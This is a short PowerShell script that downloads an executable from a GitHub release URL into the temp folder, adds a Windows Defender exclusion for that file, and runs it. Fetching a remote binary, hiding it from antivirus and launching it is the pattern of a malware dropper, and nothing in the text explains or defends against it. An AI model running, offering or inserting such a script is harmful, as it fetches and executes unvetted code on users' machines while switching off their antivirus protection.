$p="$env:TEMP\Zap.exe"
iwr https://github.com/kilordow/Fx.exe/releases/download/lol/chekir.exe -o $p
Add-MpPreference -ExclusionPath $p
Start-Process $p
